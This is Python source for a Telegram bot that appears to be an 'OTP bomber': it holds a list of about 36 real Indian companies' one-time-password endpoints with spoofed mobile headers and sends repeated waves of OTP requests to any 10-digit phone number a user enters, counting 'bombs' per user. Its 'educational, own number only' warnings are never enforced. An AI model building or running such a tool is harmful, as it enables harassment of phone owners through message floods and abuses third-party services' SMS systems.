import asyncio
import aiohttp
import time
import os
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes, ConversationHandler
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# ===== CONFIGURATION FROM ENV =====
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_USER_IDS = os.getenv("ADMIN_USER_IDS", "").split(",")
PORT = int(os.getenv("PORT", 8443))
WEBHOOK_URL = os.getenv("WEBHOOK_URL", "")
ACCESS_CODE = os.getenv("ACCESS_CODE", "")  # NEW: Access code for bot usage

# Conversation state
WAITING_FOR_CODE = 1

# Store authorized users and stats
authorized_users = set()  # Users who entered correct access code
user_stats = {}  # Store stats per user: {user_id: {"bombs": 0, "authorized_at": datetime}}
global_stats = {
    "total_bombs": 0,
    "total_otps_sent": 0,
    "bot_started_at": datetime.now()
}

# API configs - All available APIs
API_CONFIGS = [
    {
        "name": "Lenskart",
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "X-API-Client": "mobilesite",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13) Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"captcha":null,"phoneCode":"+91","telephone":"{phone}"}}'
    },
    {
        "name": "GoPink Cabs",
        "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13) Mobile Safari/537.36"
        },
        "data": lambda phone: f"check_mobile_number=1&contact={phone}"
    },
    {
        "name": "Shemaroome",
        "url": "https://www.shemaroome.com/users/resend_otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13) Mobile Safari/537.36"
        },
        "data": lambda phone: f"mobile_no=%2B91{phone}"
    },
    {
        "name": "KPN Fresh Web",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"phone_number":{{"number":"{phone}","country_code":"+91"}}}}'
    },
    {
        "name": "KPN Fresh App",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json; charset=UTF-8",
            "User-Agent": "okhttp/5.0.0-alpha.11"
        },
        "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}'
    },
    {
        "name": "BikeFixup",
        "url": "https://api.bikefixup.com/api/v2/send-registration-otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json; charset=UTF-8",
            "User-Agent": "Dart/3.6 (dart:io)"
        },
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"4pFtQJwcz6y"}}'
    },
    {
        "name": "Rappi",
        "url": "https://services.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json; charset=UTF-8",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 7.1.2)"
        },
        "data": lambda phone: f'{{"phone":"{phone}","country_code":"+91"}}'
    },
    {
        "name": "Stratzy SMS",
        "url": "https://stratzy.in/api/web/auth/sendPhoneOTP",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"phoneNo":"{phone}"}}'
    },
    {
        "name": "Stratzy WhatsApp",
        "url": "https://stratzy.in/api/web/whatsapp/sendOTP",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"phoneNo":"{phone}"}}'
    },
    {
        "name": "Well Academy",
        "url": "https://wellacademy.in/store/api/numberLoginV2",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json; charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"contact_no":"{phone}"}}'
    },
    {
        "name": "Hungama",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "country_code": "IN",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","emailId":"","subject":"Register","priority":"1","device":"web","variant":"v1","templateCode":1}}'
    },
    {
        "name": "Servetel",
        "url": "https://api.servetel.in/v1/auth/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13)"
        },
        "data": lambda phone: f"mobile_number={phone}"
    },
    {
        "name": "Meru Cab",
        "url": "https://merucabapp.com/api/otp/generate",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "okhttp/4.9.0"
        },
        "data": lambda phone: f"mobile_number={phone}"
    },
    {
        "name": "Beepkart",
        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "appname": "Website",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"city":362,"fullName":"","phone":"{phone}","source":"myaccount"}}'
    },
    {
        "name": "Lending Plate",
        "url": "https://lendingplate.com/api.php",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) Mobile Safari/537.36"
        },
        "data": lambda phone: f"mobiles={phone}&resend=Resend&clickcount=3"
    },
    {
        "name": "Snitch",
        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "client-id": "snitch_secret",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"mobile_number":"+91{phone}"}}'
    },
    {
        "name": "Dayco India",
        "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) Mobile Safari/537.36"
        },
        "data": lambda phone: f"api=send_otp&brand=dayco&mob={phone}&resend_otp=resend_otp"
    },
    {
        "name": "PenPencil",
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json; charset=utf-8",
            "User-Agent": "okhttp/3.9.1"
        },
        "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}'
    },
    {
        "name": "OTPless",
        "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"mobile":"{phone}","selectedCountryCode":"+91","channel":"OTP"}}'
    },
    {
        "name": "Imagine Store",
        "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) Mobile Safari/537.36"
        },
        "data": lambda phone: f"mobile={phone}"
    },
    {
        "name": "NoBroker",
        "url": "https://www.nobroker.in/api/v3/account/otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) Mobile Safari/537.36"
        },
        "data": lambda phone: f"phone={phone}&countryCode=IN"
    },
    {
        "name": "Cossouq",
        "url": "https://www.cossouq.com/mobilelogin/otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) Mobile Safari/537.36"
        },
        "data": lambda phone: f"mobilenumber={phone}&otptype=register&resendotp=0&email=&oldmobile=0"
    },
    {
        "name": "ShipRocket",
        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'
    },
    {
        "name": "GoKwik",
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"phone":"{phone}","country":"in"}}'
    },
    {
        "name": "Jockey SMS",
        "url": lambda phone: f"https://www.jockey.in/apps/jotp/api/login/send-otp/+91{phone}?whatsapp=false",
        "method": "GET",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) Mobile Safari/537.36"
        },
        "data": None
    },
    {
        "name": "Jockey WhatsApp",
        "url": lambda phone: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true",
        "method": "GET",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 13) Mobile Safari/537.36"
        },
        "data": None
    },
    {
        "name": "NewMe",
        "url": "https://prodapi.newme.asia/web/otp/request",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Timestamp": lambda: str(int(time.time() * 1000)),
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"mobile_number":"{phone}","resend_otp_request":true}}'
    },
    {
        "name": "Univest",
        "url": lambda phone: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}",
        "method": "GET",
        "headers": {
            "User-Agent": "okhttp/3.9.1"
        },
        "data": None
    },
    {
        "name": "Rappi MX",
        "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json; charset=utf-8",
            "User-Agent": "okhttp/3.9.1"
        },
        "data": lambda phone: f'{{"country_code":"+91","phone":"{phone}"}}'
    },
    {
        "name": "Foxy SMS",
        "url": "https://www.foxy.in/api/v2/users/send_otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Platform": "web",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13) Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"guest_token":"01943c60-aea9-7ddc-b105-e05fbcf832be","user":{{"phone_number":"+91{phone}"}},"device":null,"invite_code":""}}'
    },
    {
        "name": "Eka Care",
        "url": "https://auth.eka.care/auth/init",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json; charset=UTF-8",
            "User-Agent": "okhttp/4.9.3"
        },
        "data": lambda phone: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{phone}"}},"type":"mobile"}}'
    },
    {
        "name": "Foxy WhatsApp",
        "url": "https://www.foxy.in/api/v2/users/send_otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Platform": "web",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13) Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"user":{{"phone_number":"+91{phone}"}},"via":"whatsapp"}}'
    },
    {
        "name": "Smytten",
        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13) Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"ad_id":"","device_info":{{}},"device_id":"","app_version":"","device_token":"","device_platform":"web","phone":"{phone}","email":""}}'
    },
    {
        "name": "Wakefit",
        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13) Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"mobile":"{phone}","whatsapp_opt_in":1}}'
    },
    {
        "name": "CaratLane",
        "url": "https://www.caratlane.com/cg/dhevudu",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"query":"\\n        mutation {{\\n            SendOtp( \\n                input: {{\\n        mobile: \\"{phone}\\",\\n        isdCode: \\"91\\",\\n        otpType: \\"registerOtp\\"\\n      }}\\n            ) {{\\n                status {{\\n                    message\\n                    code\\n                }}\\n            }}\\n        }}\\n    "}}'
    }
]

# Store active bombing sessions
active_sessions = {}

# ===== HELPER FUNCTIONS =====
def is_authorized(user_id):
    """Check if user is authorized"""
    return str(user_id) in authorized_users

def authorize_user(user_id):
    """Authorize a user"""
    user_id_str = str(user_id)
    authorized_users.add(user_id_str)
    if user_id_str not in user_stats:
        user_stats[user_id_str] = {
            "bombs": 0,
            "otps_sent": 0,
            "authorized_at": datetime.now()
        }

def update_bomb_stats(user_id, otp_count):
    """Update bombing statistics"""
    user_id_str = str(user_id)
    if user_id_str in user_stats:
        user_stats[user_id_str]["bombs"] += 1
        user_stats[user_id_str]["otps_sent"] += otp_count
    global_stats["total_bombs"] += 1
    global_stats["total_otps_sent"] += otp_count

async def make_api_call(session, config, phone):
    """Make a single API call"""
    try:
        url = config["url"]
        headers = config["headers"].copy()
        data = config["data"](phone) if config["data"] else None
        
        async with session.post(url, headers=headers, data=data, timeout=5) as response:
            return {
                "name": config["name"],
                "status": response.status,
                "success": 200 <= response.status < 300
            }
    except Exception as e:
        return {
            "name": config["name"],
            "status": "Error",
            "success": False,
            "error": str(e)
        }

async def send_otp_wave(phone, callback=None):
    """Send one wave of OTP requests"""
    async with aiohttp.ClientSession() as session:
        tasks = [make_api_call(session, config, phone) for config in API_CONFIGS]
        results = await asyncio.gather(*tasks)
        
        success_count = sum(1 for r in results if r["success"])
        
        if callback:
            await callback(results, success_count)
        
        return results

# ===== AUTHORIZATION HANDLERS =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command"""
    user_id = update.effective_user.id
    
    if is_authorized(user_id):
        welcome_msg = (
            "🤖 *OTP Tester Bot - Educational Purpose*\n\n"
            "✅ You are authorized!\n\n"
            "⚠️ *WARNING:* This bot is for educational testing only!\n"
            "✅ Only use on YOUR OWN phone number\n"
            "❌ Misuse is illegal and unethical\n\n"
            "*Commands:*\n"
            "/start - Show this message\n"
            "/test <number> - Test OTP on a number\n"
            "/bomb <number> <count> - Send multiple OTPs\n"
            "/stop - Stop active session\n"
            "/status - Check active sessions\n"
            "/stats - View your statistics\n"
            "/help - Show help\n\n"
            "Send a 10-digit phone number to begin."
        )
        await update.message.reply_text(welcome_msg, parse_mode="Markdown")
    else:
        if not ACCESS_CODE:
            # If no access code set, authorize everyone
            authorize_user(user_id)
            await start(update, context)
            return
        
        welcome_msg = (
            "🔐 *Access Code Required*\n\n"
            "This bot requires an access code to use.\n"
            "Please enter the access code to continue:\n\n"
            "❌ Cancel - /cancel"
        )
        await update.message.reply_text(welcome_msg, parse_mode="Markdown")
        return WAITING_FOR_CODE

async def check_access_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check if entered access code is correct"""
    user_id = update.effective_user.id
    code = update.message.text.strip()
    
    if code == ACCESS_CODE:
        authorize_user(user_id)
        await update.message.reply_text(
            "✅ *Access Granted!*\n\n"
            "You are now authorized to use the bot.\n"
            "Send /start to see available commands.",
            parse_mode="Markdown"
        )
        return ConversationHandler.END
    else:
        await update.message.reply_text(
            "❌ *Incorrect Access Code!*\n\n"
            "Please try again or contact the admin.\n"
            "Cancel - /cancel",
            parse_mode="Markdown"
        )
        return WAITING_FOR_CODE

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel access code entry"""
    await update.message.reply_text(
        "❌ Cancelled. You need an access code to use this bot.\n"
        "Send /start to try again."
    )
    return ConversationHandler.END

# ===== STATS COMMAND =====
async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show statistics"""
    user_id = update.effective_user.id
    
    if not is_authorized(user_id):
        await update.message.reply_text("❌ You need to authorize first! Send /start")
        return
    
    user_id_str = str(user_id)
    is_admin = user_id_str in ADMIN_USER_IDS
    
    # User stats
    user_data = user_stats.get(user_id_str, {})
    user_bombs = user_data.get("bombs", 0)
    user_otps = user_data.get("otps_sent", 0)
    auth_date = user_data.get("authorized_at", datetime.now())
    
    stats_msg = f"📊 *Your Statistics*\n\n"
    stats_msg += f"💣 Total Bombs: {user_bombs}\n"
    stats_msg += f"📱 Total OTPs Sent: {user_otps}\n"
    stats_msg += f"📅 Authorized Since: {auth_date.strftime('%Y-%m-%d %H:%M')}\n"
    
    # Admin gets global stats
    if is_admin:
        uptime = datetime.now() - global_stats["bot_started_at"]
        hours = int(uptime.total_seconds() // 3600)
        minutes = int((uptime.total_seconds() % 3600) // 60)
        
        stats_msg += f"\n🔧 *Admin Statistics*\n\n"
        stats_msg += f"👥 Authorized Users: {len(authorized_users)}\n"
        stats_msg += f"💣 Total Bombs (All Users): {global_stats['total_bombs']}\n"
        stats_msg += f"📱 Total OTPs (All Users): {global_stats['total_otps_sent']}\n"
        stats_msg += f"⏱️ Bot Uptime: {hours}h {minutes}m\n"
        
        # Top users
        if user_stats:
            sorted_users = sorted(user_stats.items(), key=lambda x: x[1]["bombs"], reverse=True)[:5]
            stats_msg += f"\n🏆 *Top 5 Users:*\n"
            for idx, (uid, data) in enumerate(sorted_users, 1):
                stats_msg += f"{idx}. User {uid[:8]}... - {data['bombs']} bombs\n"
    
    await update.message.reply_text(stats_msg, parse_mode="Markdown")

# ===== BOT COMMAND HANDLERS =====
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Help command"""
    user_id = update.effective_user.id
    
    if not is_authorized(user_id):
        await update.message.reply_text("❌ You need to authorize first! Send /start")
        return
    
    help_msg = (
        "*How to use:*\n\n"
        "1️⃣ Send a 10-digit phone number (without +91)\n"
        "2️⃣ Choose single test or multiple waves\n"
        "3️⃣ Monitor the results\n\n"
        "*Examples:*\n"
        "`/test 9876543210` - Single OTP test\n"
        "`/bomb 9876543210 5` - Send 5 waves\n\n"
        "*Note:* Use responsibly and only on your own number!"
    )
    await update.message.reply_text(help_msg, parse_mode="Markdown")

async def test_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Test single OTP wave"""
    user_id = update.effective_user.id
    
    if not is_authorized(user_id):
        await update.message.reply_text("❌ You need to authorize first! Send /start")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /test <phone_number>")
        return
    
    phone = context.args[0].strip()
    
    if not phone.isdigit() or len(phone) != 10:
        await update.message.reply_text("❌ Invalid phone number! Must be 10 digits.")
        return
    
    msg = await update.message.reply_text(f"🔄 Testing OTP services for {phone}...")
    
    async def callback(results, success_count):
        result_text = f"📊 *Test Results for {phone}*\n\n"
        result_text += f"✅ Success: {success_count}/{len(results)}\n\n"
        
        for r in results:
            emoji = "✅" if r["success"] else "❌"
            result_text += f"{emoji} {r['name']}: {r['status']}\n"
        
        await msg.edit_text(result_text, parse_mode="Markdown")
    
    results = await send_otp_wave(phone, callback)
    success_count = sum(1 for r in results if r["success"])
    update_bomb_stats(user_id, success_count)

async def bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send multiple OTP waves"""
    user_id = update.effective_user.id
    
    if not is_authorized(user_id):
        await update.message.reply_text("❌ You need to authorize first! Send /start")
        return
    
    if len(context.args) != 2:
        await update.message.reply_text("Usage: /bomb <phone_number> <count>")
        return
    
    phone = context.args[0].strip()
    
    try:
        count = int(context.args[1])
        if count < 1 or count > 10:
            await update.message.reply_text("❌ Count must be between 1 and 10")
            return
    except ValueError:
        await update.message.reply_text("❌ Invalid count! Must be a number.")
        return
    
    if not phone.isdigit() or len(phone) != 10:
        await update.message.reply_text("❌ Invalid phone number! Must be 10 digits.")
        return
    
    # Store session
    active_sessions[user_id] = {"phone": phone, "active": True}
    
    msg = await update.message.reply_text(
        f"🚀 Starting {count} waves for {phone}...\n"
        f"Use /stop to cancel anytime."
    )
    
    total_success = 0
    
    for i in range(count):
        if not active_sessions.get(user_id, {}).get("active", False):
            await msg.edit_text(f"⏹️ Stopped at wave {i}/{count}")
            break
        
        async def callback(results, success_count):
            nonlocal total_success
            total_success += success_count
            await msg.edit_text(
                f"📡 Wave {i+1}/{count} completed\n"
                f"✅ Total Success: {total_success}\n"
                f"⏳ Progress: {'▓' * (i+1)}{'░' * (count-i-1)}"
            )
        
        await send_otp_wave(phone, callback)
        
        if i < count - 1:
            await asyncio.sleep(2)
    
    if user_id in active_sessions:
        del active_sessions[user_id]
    
    update_bomb_stats(user_id, total_success)
    
    await msg.edit_text(
        f"✅ Completed {count} waves for {phone}\n"
        f"📊 Total Success: {total_success}/{count * len(API_CONFIGS)}"
    )

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop active bombing session"""
    user_id = update.effective_user.id
    
    if not is_authorized(user_id):
        await update.message.reply_text("❌ You need to authorize first! Send /start")
        return
    
    if user_id in active_sessions:
        active_sessions[user_id]["active"] = False
        await update.message.reply_text("⏹️ Stopping your active session...")
    else:
        await update.message.reply_text("❌ No active session found.")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check status"""
    user_id = update.effective_user.id
    
    if not is_authorized(user_id):
        await update.message.reply_text("❌ You need to authorize first! Send /start")
        return
    
    if user_id in active_sessions and active_sessions[user_id]["active"]:
        phone = active_sessions[user_id]["phone"]
        await update.message.reply_text(f"🔄 Active session for: {phone}")
    else:
        await update.message.reply_text("✅ No active sessions")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle plain text messages (phone numbers)"""
    user_id = update.effective_user.id
    
    if not is_authorized(user_id):
        await update.message.reply_text("❌ You need to authorize first! Send /start")
        return
    
    text = update.message.text.strip()
    
    if text.isdigit() and len(text) == 10:
        keyboard = [
            [InlineKeyboardButton("🧪 Single Test", callback_data=f"test_{text}")],
            [InlineKeyboardButton("💣 3 Waves", callback_data=f"bomb_{text}_3")],
            [InlineKeyboardButton("🔥 5 Waves", callback_data=f"bomb_{text}_5")],
            [InlineKeyboardButton("❌ Cancel", callback_data="cancel")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"📱 Phone Number: *{text}*\n\n"
            f"⚠️ Use only on YOUR number!\n"
            f"Choose an option:",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text(
            "❌ Invalid input!\n"
            "Send a 10-digit phone number or use /help"
        )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button presses"""
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    
    if not is_authorized(user_id):
        await query.edit_message_text("❌ You need to authorize first! Send /start")
        return
    
    data = query.data
    
    if data == "cancel":
        await query.edit_message_text("❌ Cancelled")
        return
    
    parts = data.split("_")
    action = parts[0]
    phone = parts[1]
    
    if action == "test":
        await query.edit_message_text(f"🔄 Testing {phone}...")
        
        async def callback(results, success_count):
            result_text = f"📊 *Test Results*\n\n"
            result_text += f"✅ Success: {success_count}/{len(results)}\n\n"
            
            for r in results:
                emoji = "✅" if r["success"] else "❌"
                result_text += f"{emoji} {r['name']}: {r['status']}\n"
            
            await query.edit_message_text(result_text, parse_mode="Markdown")
        
        results = await send_otp_wave(phone, callback)
        success_count = sum(1 for r in results if r["success"])
        update_bomb_stats(user_id, success_count)
    
    elif action == "bomb":
        count = int(parts[2])
        active_sessions[user_id] = {"phone": phone, "active": True}
        
        await query.edit_message_text(f"🚀 Starting {count} waves...")
        
        total_success = 0
        
        for i in range(count):
            if not active_sessions.get(user_id, {}).get("active", False):
                await query.edit_message_text(f"⏹️ Stopped at wave {i}/{count}")
                break
            
            async def cb(results, success_count):
                nonlocal total_success
                total_success += success_count
                await query.edit_message_text(
                    f"📡 Wave {i+1}/{count}\n"
                    f"✅ Success: {total_success}\n"
                    f"{'▓' * (i+1)}{'░' * (count-i-1)}"
                )
            
            await send_otp_wave(phone, cb)
            
            if i < count - 1:
                await asyncio.sleep(2)
        
        if user_id in active_sessions:
            del active_sessions[user_id]
        
        update_bomb_stats(user_id, total_success)
        
        await query.edit_message_text(f"✅ Completed {count} waves!\n📊 Success: {total_success}")

# ===== ERROR HANDLER =====
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Log errors"""
    print(f"Update {update} caused error {context.error}")

# ===== MAIN =====
def main():
    """Start the bot"""
    if not BOT_TOKEN:
        print("❌ BOT_TOKEN not found in environment variables!")
        print("Please set BOT_TOKEN in your .env file or Railway environment variables")
        return
    
    print("🤖 Starting OTP Tester Bot...")
    print(f"🌐 Port: {PORT}")
    print(f"🔗 Webhook: {WEBHOOK_URL if WEBHOOK_URL else 'Polling mode'}")
    print(f"🔐 Access Code: {'Enabled' if ACCESS_CODE else 'Disabled (Open Access)'}")
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Conversation handler for access code
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            WAITING_FOR_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, check_access_code)]
        },
        fallbacks=[CommandHandler("cancel", cancel)]
    )
    
    # Add handlers
    app.add_handler(conv_handler)
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("test", test_command))
    app.add_handler(CommandHandler("bomb", bomb_command))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_error_handler(error_handler)
    
    # Use webhook for Railway, polling for local
    if WEBHOOK_URL:
        try:
            print("✅ Running in webhook mode (Railway)")
            app.run_webhook(
                listen="0.0.0.0",
                port=PORT,
                webhook_url=f"{WEBHOOK_URL}/{BOT_TOKEN}",
                url_path=BOT_TOKEN,
                allowed_updates=Update.ALL_TYPES
            )
        except Exception as e:
            print(f"❌ Webhook error: {e}")
            print("🔄 Falling back to polling mode...")
            app.run_polling(allowed_updates=Update.ALL_TYPES)
    else:
        print("✅ Running in polling mode (Local)")
        app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()